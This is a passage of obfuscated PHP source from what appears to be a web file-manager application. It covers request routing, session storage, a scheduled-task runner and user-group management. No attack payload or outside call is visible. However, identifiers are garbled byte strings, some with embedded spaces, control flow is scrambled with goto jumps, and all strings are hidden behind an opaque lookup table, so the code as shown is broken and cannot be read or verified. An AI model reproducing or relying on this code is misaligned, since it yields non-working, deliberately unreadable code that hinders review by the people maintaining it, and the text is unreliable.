error($bğøâÑŒ…”) { self::$errorCallback = $bğøâÑŒ…”; } public static function haltOnMatch($e³±›ÖøŸ = true) { self::$halts = $e³±›ÖøŸ; } public static function dispatch() { goto Bíµ…ƒÚÂ¿; Fƒ°–ÎÚ¼à: $F¯İƒêÕË = array_keys(static::$patterns); $FÏ–áÌ ø² = array_values(static::$patterns); $D´‹×‘‰·À = !1; goto Bõç“ˆÛò¬; Bõç“ˆÛò¬: self::$routes = preg_replace($FáËÑ”ÉÄã[1064], $FáËÑ”ÉÄã[8], self::$routes); if (in_array($E«™ƒÃ¢Ó©, self::$routes)) { $dğ¿©ßÔ×Æ = array_keys(self::$routes, $E«™ƒÃ¢Ó©); foreach ($dğ¿©ßÔ×Æ as $f¨İØÕã ‹) { if (self::$methods[$f¨İØÕã ‹] == $e–£öÕ„Ş¥ || self::$methods[$f¨İØÕã ‹] == $FáËÑ”ÉÄã[1356] || in_array($e–£öÕ„Ş¥, self::$maps[$f¨İØÕã ‹])) { $D´‹×‘‰·À = !0; if (!is_object(self::$callbacks[$f¨İØÕã ‹])) { $Aå„Îùà°ù = explode($FáËÑ”ÉÄã[8], self::$callbacks[$f¨İØÕã ‹]); $B…¤¿µëÀÍ = end($Aå„Îùà°ù); $dÊ÷¥•ŠŸç = explode($FáËÑ”ÉÄã[1357], $B…¤¿µëÀÍ); $d§–ÇŠŠ±è = new $dÊ÷¥•ŠŸç[0](); $d§–ÇŠŠ±è->{$dÊ÷¥•ŠŸç[1]}(); if (self::$halts) { return; } } else { call_user_func(self::$callbacks[$f¨İØÕã ‹]); if (self::$halts) { return; } } } } } else { $E°„õÚŠ– = 0; foreach (self::$routes as $f¨İØÕã ‹) { if (strpos($f¨İØÕã ‹, $FáËÑ”ÉÄã[4]) !== !1) { $f¨İØÕã ‹ = str_replace($F¯İƒêÕË, $FÏ–áÌ ø², $f¨İØÕã ‹); } if (preg_match($FáËÑ”ÉÄã[1358] . $f¨İØÕã ‹ . $FáËÑ”ÉÄã[1359], $E«™ƒÃ¢Ó©, $f½¥…­ÄÍ)) { if (self::$methods[$E°„õÚŠ–] == $e–£öÕ„Ş¥ || self::$methods[$E°„õÚŠ–] == $FáËÑ”ÉÄã[1356] || !empty(self::$maps[$E°„õÚŠ–]) && in_array($e–£öÕ„Ş¥, self::$maps[$E°„õÚŠ–])) { $D´‹×‘‰·À = !0; array_shift($f½¥…­ÄÍ); if (!is_object(self::$callbacks[$E°„õÚŠ–])) { $Aå„Îùà°ù = explode($FáËÑ”ÉÄã[8], self::$callbacks[$E°„õÚŠ–]); $B…¤¿µëÀÍ = end($Aå„Îùà°ù); $dÊ÷¥•ŠŸç = explode($FáËÑ”ÉÄã[1357], $B…¤¿µëÀÍ); $d§–ÇŠŠ±è = new $dÊ÷¥•ŠŸç[0](); if (!method_exists($d§–ÇŠŠ±è, $dÊ÷¥•ŠŸç[1])) { echo $FáËÑ”ÉÄã[1360]; } else { call_user_func_array(array($d§–ÇŠŠ±è, $dÊ÷¥•ŠŸç[1]), $f½¥…­ÄÍ); } if (self::$halts) { return; } } else { call_user_func_array(self::$callbacks[$E°„õÚŠ–], $f½¥…­ÄÍ); if (self::$halts) { return; } } } } $E°„õÚŠ–++; } } if ($D´‹×‘‰·À == !1) { if (!self::$errorCallback) { self::$errorCallback = function () { $d†Äáª·õ­ =& $_SERVER[õëù©û]; header($_SERVER[$d†Äáª·õ­[1361]] . $d†Äáª·õ­[1362]); echo $d†Äáª·õ­[1363]; }; } else { if (is_string(self::$errorCallback)) { self::get($_SERVER[$FáËÑ”ÉÄã[1355]], self::$errorCallback); self::$errorCallback = null; self::dispatch(); return; } } call_user_func(self::$errorCallback); } goto Eé«¹²¶; Bíµ…ƒÚÂ¿: $FáËÑ”ÉÄã =& $_SERVER[õëù©û]; $E«™ƒÃ¢Ó© = parse_url($_SERVER[$FáËÑ”ÉÄã[1355]], PHP_URL_PATH); $e–£öÕ„Ş¥ = $_SERVER[$FáËÑ”ÉÄã[150]]; goto Fƒ°–ÎÚ¼à; Eé«¹²¶: } } class Session { public static $sessionTime; public static $sessionSign; public static $handle; public static $data; public static function init() { goto a¥¸‰ä‡Ä†; C¡¶ ™£Ø‰: switch ($a‘‡£İ¾Ë¸) { case $DµÑ”¶Ì…‘[17]: self::$handle = Model($DµÑ”¶Ì…‘[750]); break; case $DµÑ”¶Ì…‘[751]: self::$handle = new CacheRedis($cË£ß©›½¦, $e©±¤ÓŞœ£); break; case $DµÑ”¶Ì…‘[752]: self::$handle = new CacheMemcached($cË£ß©›½¦, $e©±¤ÓŞœ£); break; case $DµÑ”¶Ì…‘[163]: $cË£ß©›½¦[$DµÑ”¶Ì…‘[75]] = $cË£ß©›½¦[$DµÑ”¶Ì…‘[75]] . $DµÑ”¶Ì…‘[1367]; self::$handle = new CacheFile($cË£ß©›½¦, $e©±¤ÓŞœ£); default: break; } if (!self::$data) { CacheLock::lock(self::$sessionSign); self::$data = self::$handle->get(self::$sessionSign); CacheLock::unlock(self::$sessionSign); self::$data = unserialize(self::$data); if (!is_array(self::$data)) { self::$data = array(); } } $FêäÁ‘‰ = new self(); goto fù¨òÓ‘—Ù; e‡×–Ä§ÚÂ: $AÓ³¶¬¥¾î = _get($GLOBALS, $DµÑ”¶Ì…‘[1365], $AÓ³¶¬¥¾î); if (self::$sessionSign) { } else { if (Cookie::get($AÓ³¶¬¥¾î)) { self::$sessionSign = Cookie::get($AÓ³¶¬¥¾î); } else { self::$sessionSign = guid(); } } Cookie::setSafe($AÓ³¶¬¥¾î, self::$sessionSign, self::$sessionTime); goto Aàëé„Üãƒ; Aàëé„Üãƒ: $a‘‡£İ¾Ë¸ = $f‚ó¿÷âÃï[$DµÑ”¶Ì…‘[1366]]; $cË£ß©›½¦ = $f‚ó¿÷âÃï[$a‘‡£İ¾Ë¸]; $e©±¤ÓŞœ£ = $f‚ó¿÷âÃï[$DµÑ”¶Ì…‘[749]]; goto C¡¶ ™£Ø‰; eĞÖ†Ú¾ğö: $f‚ó¿÷âÃï = $GLOBALS[$DµÑ”¶Ì…‘[6]][$DµÑ”¶Ì…‘[333]]; self::$sessionTime = $f‚ó¿÷âÃï[$DµÑ”¶Ì…‘[1364]]; $AÓ³¶¬¥¾î = SESSION_ID; goto e‡×–Ä§ÚÂ; fù¨òÓ‘—Ù: return $FêäÁ‘‰; goto CÀ’é¾®à¡; a¥¸‰ä‡Ä†: $DµÑ”¶Ì…‘ =& $_SERVER[õëù©û]; static $FêäÁ‘‰ = false; if ($FêäÁ‘‰) { return $FêäÁ‘‰; } goto eĞÖ†Ú¾ğö; CÀ’é¾®à¡: } public static function sign($fòô£Œ¹ í = false) { $fòô£Œ¹ í && (self::$sessionSign = $fòô£Œ¹ í); self::init(); return self::$sessionSign; } public static function set($AÙ¼“¹ï†, $böàŒÏ‡ = false) { self::init(); if (is_array($AÙ¼“¹ï†)) { foreach ($AÙ¼“¹ï† as $EÕ¯×½ºØ => $c›ùâÉŠ³Á) { array_set_value(self::$data, $EÕ¯×½ºØ, $c›ùâÉŠ³Á); } } else { array_set_value(self::$data, $AÙ¼“¹ï†, $böàŒÏ‡); } CacheLock::lock(self::$sessionSign); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); CacheLock::unlock(self::$sessionSign); } public static function get($Bğó¿£‹×÷ = false) { self::init(); if (!$Bğó¿£‹×÷) { return self::$data; } return array_get_value(self::$data, $Bğó¿£‹×÷); } public static function remove($EÖŞ¯ˆäÂŞ) { self::init(); unset(self::$data[$EÖŞ¯ˆäÂŞ]); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); } public static function destory() { Cookie::remove(SESSION_ID, !0); self::init(); self::clearTimeout(); self::$data = array(); return self::$handle->remove(self::$sessionSign); } public static function clearTimeout() { self::init(); if (method_exists(self::$handle, $_SERVER[õëù©û][754])) { self::$handle->clearTimeout(); } } } class AutoTask { public static function start() { goto F˜ä†í»›æ; BŠçæ²‰ÃÂ: while (!0) { self::cacheClear(); if (self::valueGet($bĞâ†ùó®[684]) != $bĞâ†ùó®[83]) { self::valueSet($bĞâ†ùó®[1368], $bĞâ†ùó®[463]); self::log($bĞâ†ùó®[1372]); die; } self::valueSet($bĞâ†ùó®[1368], $bĞâ†ùó®[83]); self::valueSet($bĞâ†ùó®[1369], time()); self::taskRunAll(); sleep(self::valueGet($bĞâ†ùó®[1373])); } goto Eá©´ôİ¬¢; F˜ä†í»›æ: $bĞâ†ùó® =& $_SERVER[õëù©û]; if (self::valueGet($bĞâ†ùó®[684]) != $bĞâ†ùó®[83]) { return; } if (self::valueGet($bĞâ†ùó®[1368]) == $bĞâ†ùó®[83]) { $D³¬‰…Ş‡ª = self::valueGet($bĞâ†ùó®[1369]); if (time() - $D³¬‰…Ş‡ª > 3600 * 2) { self::restart(); } return; } goto Ağ®ƒªÏò; Ağ®ƒªÏò: http_close(); self::valueSet($bĞâ†ùó®[1368], $bĞâ†ùó®[83]); Hook::bind($bĞâ†ùó®[1370], $bĞâ†ùó®[1371]); goto BŠçæ²‰ÃÂ; Eá©´ôİ¬¢: } public static function restart() { $BÕØ‹»³§ª =& $_SERVER[õëù©û]; http_close(); self::valueSet($BÕØ‹»³§ª[684], $BÕØ‹»³§ª[463]); sleep(self::valueGet($BÕØ‹»³§ª[1373]) + 5); self::valueSet($BÕØ‹»³§ª[1368], $BÕØ‹»³§ª[463]); self::valueSet($BÕØ‹»³§ª[684], $BÕØ‹»³§ª[83]); } public static function shutdownEvent() { $c»Í»ÜÙ– =& $_SERVER[õëù©û]; self::valueSet($c»Í»ÜÙ–[1368], $c»Í»ÜÙ–[463]); self::log($c»Í»ÜÙ–[1374]); } public static function config($Ašö©èÀÇ, $eæˆâ£×Õ¯) { $fÌ˜³½õßé =& $_SERVER[õëù©û]; $FËøäæî¬  = 20; $eæˆâ£×Õ¯ = intval($eæˆâ£×Õ¯) <= $FËøäæî¬  ? $FËøäæî¬  : intval($eæˆâ£×Õ¯); self::valueSet($fÌ˜³½õßé[684], $Ašö©èÀÇ); self::valueSet($fÌ˜³½õßé[1373], $eæˆâ£×Õ¯); } private static function taskRunAll() { $a¤ÍğùÁÜ =& $_SERVER[õëù©û]; $D°®†‚¨à‰ = Model($a¤ÍğùÁÜ[1375])->listData(); $c¨îùïÆÇ = count($D°®†‚¨à‰); for ($EÅÔ¾‡ÒÀ§ = 0; $EÅÔ¾‡ÒÀ§ < $c¨îùïÆÇ; $EÅÔ¾‡ÒÀ§++) { $cÎ÷è·Êæ = $D°®†‚¨à‰[$EÅÔ¾‡ÒÀ§]; if ($cÎ÷è·Êæ[$a¤ÍğùÁÜ[1376]] != $a¤ÍğùÁÜ[83]) { continue; } if (!self::taskTimeCheck($cÎ÷è·Êæ)) { continue; } self::taskRun($cÎ÷è·Êæ); } Hook::trigger($a¤ÍğùÁÜ[1377]); } private static function taskTimeCheck($dÛÎÜÎŞ×•) { goto cÛ·¢†ó¥ß; dÚğ»ÒµÙ‰: $AÌöˆ¶ã¨ = strtotime($aÊŸ²ÖŠ‘¶[1378] . $BÍâ¤„ÃÑ[$aÊŸ²ÖŠ‘¶[1379]] . $aÊŸ²ÖŠ‘¶[1380]) - strtotime($aÊŸ²ÖŠ‘¶[1381]); $d…æåè½…­ = time() - strtotime(date($aÊŸ²ÖŠ‘¶[1382]) . $aÊŸ²ÖŠ‘¶[1383]); $B¥­ÛÙ¤· = $d…æåè½…­ >= $AÌöˆ¶ã¨ && $d…æåè½…­ <= $AÌöˆ¶ã¨ + 3600; goto EÌ©ƒÙÖã; cÛ·¢†ó¥ß: $aÊŸ²ÖŠ‘¶ =& $_SERVER[õëù©û]; $BÍâ¤„ÃÑ = json_decode($dÛÎÜÎŞ×•[$aÊŸ²ÖŠ‘¶[186]], !0); $C¤Ôé”ïãŸ = intval($dÛÎÜÎŞ×•[$aÊŸ²ÖŠ‘¶[1369]]); goto dÚğ»ÒµÙ‰; EÌ©ƒÙÖã: switch ($BÍâ¤„ÃÑ[$aÊŸ²ÖŠ‘¶[29]]) { case $aÊŸ²ÖŠ‘¶[1384]: if (time() - $C¤Ôé”ïãŸ < 3600 * 24 * 30) { return !1; } if ($BÍâ¤„ÃÑ[$aÊŸ²ÖŠ‘¶[1384]] == date($aÊŸ²ÖŠ‘¶[1385]) && $B¥­ÛÙ¤·) { return !0; } break; case $aÊŸ²ÖŠ‘¶[1386]: if (time() - $C¤Ôé”ïãŸ < 3600 * 24 * 7) { return !1; } $Dæ‹òù¾ = date($aÊŸ²ÖŠ‘¶[1387]) == 0 ? 7 : date($aÊŸ²ÖŠ‘¶[1387]); if ($BÍâ¤„ÃÑ[$aÊŸ²ÖŠ‘¶[1386]] == $Dæ‹òù¾ && $B¥­ÛÙ¤·) { return !0; } break; case $aÊŸ²ÖŠ‘¶[1379]: if (time() - $C¤Ôé”ïãŸ < 3600 * 24) { return !1; } if ($B¥­ÛÙ¤·) { return !0; } break; case $aÊŸ²ÖŠ‘¶[1388]: if (time() - $C¤Ôé”ïãŸ >= floatval($BÍâ¤„ÃÑ[$aÊŸ²ÖŠ‘¶[1388]]) * 60) { return !0; } break; default: break; } return !1; goto F‡¶‹Öñ¸™; F‡¶‹Öñ¸™: } public static function taskRun($F½¡Ÿ˜œæ†) { goto e‰ò‚ªåË ; f··Ğ£ÔİŠ: Model($c†ÚÌª×Î[1393])->add(array($c†ÚÌª×Î[1394] => $c†ÚÌª×Î[33], $c†ÚÌª×Î[1395] => $c†ÚÌª×Î[463], $c†ÚÌª×Î[29] => $c†ÚÌª×Î[1396] . $F½¡Ÿ˜œæ†[$c†ÚÌª×Î[363]], $c†ÚÌª×Î[1397] => json_encode(array($c†ÚÌª×Î[28] => $F½¡Ÿ˜œæ†[$c†ÚÌª×Î[28]], $c†ÚÌª×Î[1398] => timeFloat() - $eŒÎ‰£İ¥“, $c†ÚÌª×Î[277] => $c˜¹Œß‘ã)))); self::log($c†ÚÌª×Î[1399] . $F½¡Ÿ˜œæ†[$c†ÚÌª×Î[363]] . $c†ÚÌª×Î[1400] . $c˜¹Œß‘ã); return !0; goto CµÒë¥Š; e‰ò‚ªåË : $c†ÚÌª×Î =& $_SERVER[õëù©û]; self::log($c†ÚÌª×Î[1389] . $F½¡Ÿ˜œæ†[$c†ÚÌª×Î[363]] . $c†ÚÌª×Î[1390] . $F½¡Ÿ˜œæ†[$c†ÚÌª×Î[28]] . $c†ÚÌª×Î[1391] . $F½¡Ÿ˜œæ†[$c†ÚÌª×Î[1392]]); Model($c†ÚÌª×Î[1375])->run($F½¡Ÿ˜œæ†[$c†ÚÌª×Î[363]]); goto Cƒ½‘Ööó†; Cƒ½‘Ööó†: $eŒÎ‰£İ¥“ = timeFloat(); $c˜¹Œß‘ã = $c†ÚÌª×Î[33]; switch ($F½¡Ÿ˜œæ†[$c†ÚÌª×Î[29]]) { case $c†ÚÌª×Î[291]: $dáåâÔó£¼ = url_request($F½¡Ÿ˜œæ†[$c†ÚÌª×Î[1392]], $c†ÚÌª×Î[212], !1, !1, !1, !1, 5); $c˜¹Œß‘ã = strlen($dáåâÔó£¼); break; case $c†ÚÌª×Î[211]: $c˜¹Œß‘ã = Hook::apply($F½¡Ÿ˜œæ†[$c†ÚÌª×Î[1392]]); default: break; } goto f··Ğ£ÔİŠ; CµÒë¥Š: } private static function valueGet($Aí·é¡ã²Á) { $B³Áâ×ÅÂ» =& $_SERVER[õëù©û]; $d‰È¼í®„ = $B³Áâ×ÅÂ»[1401]; $A¡×…ŠìÔÊ = Model($B³Áâ×ÅÂ»[1402])->get($Aí·é¡ã²Á, $d‰È¼í®„); if (is_null($A¡×…ŠìÔÊ)) { Model($B³Áâ×ÅÂ»[1402])->set($B³Áâ×ÅÂ»[1373], 10, $d‰È¼í®„); Model($B³Áâ×ÅÂ»[1402])->set($B³Áâ×ÅÂ»[684], $B³Áâ×ÅÂ»[83], $d‰È¼í®„); Model($B³Áâ×ÅÂ»[1402])->set($B³Áâ×ÅÂ»[1368], $B³Áâ×ÅÂ»[463], $d‰È¼í®„); $A¡×…ŠìÔÊ = Model($B³Áâ×ÅÂ»[1402])->get($Aí·é¡ã²Á, $d‰È¼í®„); } return $A¡×…ŠìÔÊ; } private static function valueSet($dšìàóè÷Õ, $DùÛÅÆ²´“) { $dØËâøÒÆ =& $_SERVER[õëù©û]; return Model($dØËâøÒÆ[1402])->set($dšìàóè÷Õ, $DùÛÅÆ²´“, $dØËâøÒÆ[1401]); } protected static function log($B‡†ŠôÕ”) { write_log($B‡†ŠôÕ”, $_SERVER[õëù©û][1403]); } private static function cacheClear() { $fÎ‘íâõìÜ =& $_SERVER[õëù©û]; $cƒÎİôĞ¦­ = Model($fÎ‘íâõìÜ[1402])->cacheKey($fÎ‘íâõìÜ[1401]); Cache::clearMemory($cƒÎİôĞ¦­); } } goto AğÂì¤½Ò; eËïèèÔ»„: class GroupModel extends ModelBase { protected $tableName = "\147\162\x6f\x75\x70"; protected $tableMeta = array("\x74\x61\x62\x6c\x65\116\x61\x6d\x65" => "\147\x72\157\x75\160\x5f\155\145\x74\141", "\x6d\145\164\141\106\151\x65\154\144" => "\x67\162\157\x75\x70\x49\x44"); protected function cacheFunctionAlias($dÌ°îÔáÌ›) { $E›¢Ì®®–¤ =& $_SERVER[õëù©û]; return array($E›¢Ì®®–¤[2134] => array($dÌ°îÔáÌ›[0], $E›¢Ì®®–¤[2135]), $E›¢Ì®®–¤[2136] => array($dÌ°îÔáÌ›[0], $E›¢Ì®®–¤[2135])); } protected function getInfo($aÎíïÚå¤à) { $Aïø »Ï…ñ = $this->getInfoSimple($aÎíïÚå¤à); if (!$Aïø »Ï…ñ) { return !1; } return $this->_listDataApplyItem($Aïø »Ï…ñ); } protected function getInfoSimple($fÚî¡–ˆã, $DâòÜƒÆ¢Ñ = false) { $cîêŠ¨ÁÁ· =& $_SERVER[õëù©û]; if ($DâòÜƒÆ¢Ñ) { $A¼‚İËÑ» = array($cîêŠ¨ÁÁ·[2068] => intval($fÚî¡–ˆã)); $F¿±Ÿ ĞÎÄ = $this->where($A¼‚İËÑ»)->find(); return is_array($F¿±Ÿ ĞÎÄ) ? $F¿±Ÿ ĞÎÄ : array(); } return $this->cacheFunctionGet($cîêŠ¨ÁÁ·[2137], $fÚî¡–ˆã); } protected function groupAdd($CÚ¤‰òã«š) { goto A¬òïù¥´Ñ; A¬òïù¥´Ñ: $E¼îÙïŞ‹ò =& $_SERVER[õëù©û]; if (!$CÚ¤‰òã«š[$E¼îÙïŞ‹ò[456]] && isset($CÚ¤‰òã«š[$E¼îÙïŞ‹ò[2068]]) && $CÚ¤‰òã«š[$E¼îÙïŞ‹ò[2068]] == 1) { if ($cêöÑ‡¯¤ = $this->getInfoSimple($CÚ¤‰òã«š[$E¼îÙïŞ‹ò[2068]], !0)) { return $CÚ¤‰òã«š[$E¼îÙïŞ‹ò[2068]]; } } else { $cêöÑ‡¯¤ = $this->getInfoSimple($CÚ¤‰òã«š[$E¼îÙïŞ‹ò[456]]); if (!$cêöÑ‡¯¤) { return !1; } } $Aå›™ñÁ‘ = $E¼îÙïŞ‹ò[465]; goto F¢ã‡°á÷£; F¢ã‡°á÷£: if ($cêöÑ‡¯¤[$E¼îÙïŞ‹ò[454]]) { $Aå›™ñÁ‘ = $cêöÑ‡¯¤[$E¼îÙïŞ‹ò[454]] . $cêöÑ‡¯¤[$E¼îÙïŞ‹ò[2068]] . $E¼îÙïŞ‹ò[47]; } $AÎ«™¸ö®ö = array($E¼îÙïŞ‹ò[382] => $this->groupNameAuto($CÚ¤‰òã«š[$E¼îÙïŞ‹ò[456]], $CÚ¤‰òã«š[$E¼îÙïŞ‹ò[28]]), $E¼îÙïŞ‹ò[364] => $CÚ¤‰òã«š[$E¼îÙïŞ‹ò[456]], $E¼îÙïŞ‹ò[520] => $Aå›™ñÁ‘, $E¼îÙïŞ‹ò[2138] => $CÚ¤‰òã«š[$E¼îÙïŞ‹ò[2052]], $E¼îÙïŞ‹ò[2139] => 0, $E¼îÙïŞ‹ò[2072] => 0); if (isset($CÚ¤‰òã«š[$E¼îÙïŞ‹ò[2089]])) { $AÎ«™¸ö®ö[$E¼îÙïŞ‹ò[2089]] = $CÚ¤‰òã«š[$E¼îÙïŞ‹ò[2089]]; } else { $BŞ¸¢Ÿï = $this->max($E¼îÙïŞ‹ò[2089]); if (!$BŞ¸¢Ÿï) { $BŞ¸¢Ÿï = 0; } $AÎ«™¸ö®ö[$E¼îÙïŞ‹ò[2089]] = $BŞ¸¢Ÿï + 1; } goto E¼…«¥ÂÊò; E¼…«¥ÂÊò: if (!empty($CÚ¤‰òã«š[$E¼îÙïŞ‹ò[2068]])) { $AÎ«™¸ö®ö[$E¼îÙïŞ‹ò[2068]] = $CÚ¤‰òã«š[$E¼îÙïŞ‹ò[2068]]; } $B§Ç±Ó‰ø = $this->add($AÎ«™¸ö®ö); $this->setNamePinyin($B§Ç±Ó‰ø, $AÎ«™¸ö®ö[$E¼îÙïŞ‹ò[28]]); goto A¬Ô‚ˆ†½Ø; A¬Ô‚ˆ†½Ø: Model($E¼îÙïŞ‹ò[1101])->groupRootAdd($B§Ç±Ó‰ø); return $B§Ç±Ó‰ø; goto D„ªÄô·Ğ›; D„ªÄô·Ğ›: } protected function groupEdit($DÇÛ·¤£Ãˆ, $FÀÅô–ÅÏ–) { $bİë³Ô˜Š =& $_SERVER[õëù©û]; if (!empty($FÀÅô–ÅÏ–[$bİë³Ô˜Š[456]])) { $c’ÔĞÛ¡£õ = $this->getInfoSimple($DÇÛ·¤£Ãˆ); $EâÊó¯š¯ = $this->getInfoSimple($FÀÅô–ÅÏ–[$bİë³Ô˜Š[456]]); if (!$c’ÔĞÛ¡£õ || !$EâÊó¯š¯) { return !1; } if ($c’ÔĞÛ¡£õ[$bİë³Ô˜Š[2068]] == $EâÊó¯š¯[$bİë³Ô˜Š[2068]]) { return !1; } if ($FÀÅô–ÅÏ–[$bİë³Ô˜Š[456]] != $c’ÔĞÛ¡£õ[$bİë³Ô˜Š[456]]) { if ($EâÊó¯š¯[$bİë³Ô˜Š[454]] !== $c’ÔĞÛ¡£õ[$bİë³Ô˜Š[454]] && strpos($EâÊó¯š¯[$bİë³Ô˜Š[454]], $c’ÔĞÛ¡£õ[$bİë³Ô˜Š[454]] . $c’ÔĞÛ¡£õ[$bİë³Ô˜Š[2068]] . $bİë³Ô˜Š[47]) === 0) { return !1; } $FÀÅô–ÅÏ–[$bİë³Ô˜Š[520]] = $EâÊó¯š¯[$bİë³Ô˜Š[454]] . $FÀÅô–ÅÏ–[$bİë³Ô˜Š[456]] . $bİë³Ô˜Š[47]; $this->_changeChildLevel($c’ÔĞÛ¡£õ, $EâÊó¯š¯); } } if (isset($FÀÅô–ÅÏ–[$bİë³Ô˜Š[28]])) { $this->setNamePinyin($DÇÛ·¤£Ãˆ, $FÀÅô–ÅÏ–[$bİë³Ô˜Š[28]]); } return $this->where(array($bİë³Ô˜Š[2140] => $DÇÛ·¤£Ãˆ))->save($FÀÅô–ÅÏ–); } private function _changeChildLevel($Cˆß»âŞ¹, $C¶“¶Ì¹‰‡, $F¯«’ôòòÜ = false) { goto eÆ²„ƒ¼É; eÆ²„ƒ¼É: $CáïÉ“ÜŠ =& $_SERVER[õëù©û]; $f‚¹ØÜîğ§ = $Cˆß»âŞ¹[$CáïÉ“ÜŠ[454]] . $Cˆß»âŞ¹[$CáïÉ“ÜŠ[2068]] . $CáïÉ“ÜŠ[47]; $CŠçÏøöÖÃ = $C¶“¶Ì¹‰‡[$CáïÉ“ÜŠ[454]] . $C¶“¶Ì¹‰‡[$CáïÉ“ÜŠ[2068]] . $CáïÉ“ÜŠ[47] . $Cˆß»âŞ¹[$CáïÉ“ÜŠ[2068]] . $CáïÉ“ÜŠ[47]; goto bìÊ£ñ½îƒ; aøØ´…ÜµÔ: $this->where($a„Áé÷ßÒ†)->data($D–÷‡µñ‰é)->save(); goto C·ÑÂÍµ‡; bìÊ£ñ½îƒ: if ($F¯«’ôòòÜ) { $CŠçÏøöÖÃ = $C¶“¶Ì¹‰‡[$CáïÉ“ÜŠ[454]] . $C¶“¶Ì¹‰‡[$CáïÉ“ÜŠ[2068]] . $CáïÉ“ÜŠ[47]; } $a„Áé÷ßÒ† = array($CáïÉ“ÜŠ[520] => array($CáïÉ“ÜŠ[478], $Cˆß»âŞ¹[$CáïÉ“ÜŠ[454]] . $Cˆß»âŞ¹[$CáïÉ“ÜŠ[2068]] . $CáïÉ“ÜŠ[479])); $D–÷‡µñ‰é = array($CáïÉ“ÜŠ[520] => array($CáïÉ“ÜŠ[529], "\x72\x65\160\x6c\141\x63\145\50\160\141\x72\x65\x6e\164\114\x65\166\145\154\54\47{$f‚¹ØÜîğ§}\x27\54\x27{$CŠçÏøöÖÃ}\x27\x29")); goto aøØ´…ÜµÔ; C·ÑÂÍµ‡: } public function setNamePinyin($aäÎĞŸ§à˜, $AöŒŠƒ†µÊ = false) { $DğÀ¡ğ¸Š¾ =& $_SERVER[õëù©û]; if (!$AöŒŠƒ†µÊ) { $F™Ë’ƒÁª = $this->getInfoSimple($aäÎĞŸ§à˜); $AöŒŠƒ†µÊ = $F™Ë’ƒÁª[$DğÀ¡ğ¸Š¾[28]]; } if (!Input::check($AöŒŠƒ†µÊ, $DğÀ¡ğ¸Š¾[523])) { $this->metaSet($aäÎĞŸ§à˜, $DğÀ¡ğ¸Š¾[411], null); $this->metaSet($aäÎĞŸ§à˜, $DğÀ¡ğ¸Š¾[410], null); return; } $a¶—´Æ•Áè = array($DğÀ¡ğ¸Š¾[411] => str_replace($DğÀ¡ğ¸Š¾[50], $DğÀ¡ğ¸Š¾[33], Pinyin::encode($AöŒŠƒ†µÊ)), $DğÀ¡ğ¸Š¾[410] => Pinyin::encode($AöŒŠƒ†µÊ, $DğÀ¡ğ¸Š¾[524])); $this->metaSet($aäÎĞŸ§à˜, $a¶—´Æ•Áè); } protected function groupStatus($cÍæÂ•ñ, $F¹‹‹™±å¡, $cõ®ê©ÈÜ = true) { $Bëõ„‰¢­¾ =& $_SERVER[õëù©û]; $eîÏ¬İ×é‹ = $this->getInfoSimple($cÍæÂ•ñ); if (!$eîÏ¬İ×é‹) { return !1; } if ($cõ®ê©ÈÜ) { $this->_groupStatusApply($eîÏ¬İ×é‹, $F¹‹‹™±å¡); } $C‡‡ùÅ¦«¸ = array($Bëõ„‰¢­¾[2068] => $cÍæÂ•ñ, $Bëõ„‰¢­¾[89] => $Bëõ„‰¢­¾[684], $Bëõ„‰¢­¾[355] => $F¹‹‹™±å¡); return Model($Bëõ„‰¢­¾[2141])->add($C‡‡ùÅ¦«¸, array(), !0); } private function _groupStatusApply($dòäËá»¤à, $Eö½‹»Â) { $e‚×³ÂÑ± =& $_SERVER[õëù©û]; if ($Eö½‹»Â == $e‚×³ÂÑ±[83]) { $Fù¹™¼…š = $this->parentLevelArray($dòäËá»¤à[$e‚×³ÂÑ±[454]]); } else { $dÍ¦¢Üëñè = array($e‚×³ÂÑ±[520] => array($e‚×³ÂÑ±[478], $dòäËá»¤à[$e‚×³ÂÑ±[454]] . $dòäËá»¤à[$e‚×³ÂÑ±[2068]] . $e‚×³ÂÑ±[479])); $Fù¹™¼…š = $this->where($dÍ¦¢Üëñè)->field($e‚×³ÂÑ±[2068])->select(); $Fù¹™¼…š = array_to_keyvalue($Fù¹™¼…š, $e‚×³ÂÑ±[33], $e‚×³ÂÑ±[2068]); } if (empty($Fù¹™¼…š)) { return; } $dÍ¦¢Üëñè = array($e‚×³ÂÑ±[2068] => array($e‚×³ÂÑ±[7], $Fù¹™¼…š), $e‚×³ÂÑ±[89] => $e‚×³ÂÑ±[684], $e‚×³ÂÑ±[355] => $Eö½‹»Â ? $e‚×³ÂÑ±[463] : $e‚×³ÂÑ±[83]); Model($e‚×³ÂÑ±[2141])->where($dÍ¦¢Üëñè)->save(array($e‚×³ÂÑ±[355] => $Eö½‹»Â)); } protected function groupRemove($bÕÕÉÌÙƒÛ) { goto d‚ÀêîÂóÊ; d•½‚Ë¸Ÿ: $this->where(array($Dİ¢öİƒ[456] => $bÕÕÉÌÙƒÛ))->save(array($Dİ¢öİƒ[456] => $B·ÉôÅºÆÚ[$Dİ¢öİƒ[456]])); Model($Dİ¢öİƒ[2141])->where($cç½å´Ô‘å)->delete(); Model($Dİ¢öİƒ[2142])->where($cç½å´Ô‘å)->delete(); goto Fà†ì«õ•; d‚ÀêîÂóÊ: $Dİ¢öİƒ =& $_SERVER[õëù©û]; $cç½å´Ô‘å = array($Dİ¢öİƒ[2068] => $bÕÕÉÌÙƒÛ); $B·ÉôÅºÆÚ = $this->where($cç½å´Ô‘å)->find(); goto AÀß»®ãÄÕ; Fà†ì«õ•: Model($Dİ¢öİƒ[747])->groupRootRemove($bÕÕÉÌÙƒÛ); return $this->where($cç½å´Ô‘å)->delete(); goto dñÛ¯Ø‰; AÀß»®ãÄÕ: if (!$B·ÉôÅºÆÚ || $B·ÉôÅºÆÚ[$Dİ¢öİƒ[456]] == 0) { return !1; } $ešŠªƒä‡Ù = $this->getInfoSimple($B·ÉôÅºÆÚ[$Dİ¢öİƒ[456]]); $this->_changeChildLevel($B·ÉôÅºÆÚ, $ešŠªƒä‡Ù, !0); goto d•½‚Ë¸Ÿ; dñÛ¯Ø‰: } public function listData() { $d«£Ñ×Ê¨ù = $this->_makeOrder()->selectPage(50); $this->_listDataApply($d«£Ñ×Ê¨ù[$_SERVER[õëù©û][350]]); return $d«£Ñ×Ê¨ù; } private function _makeOrder($dÅ¢…ÙŠ­ = '') { goto eïÄ¬£‚ğí; eïÄ¬£‚ğí: $c‡§¸ÂöŠ° =& $_SERVER[õëù©û]; $f„èƒ˜£¤ò = 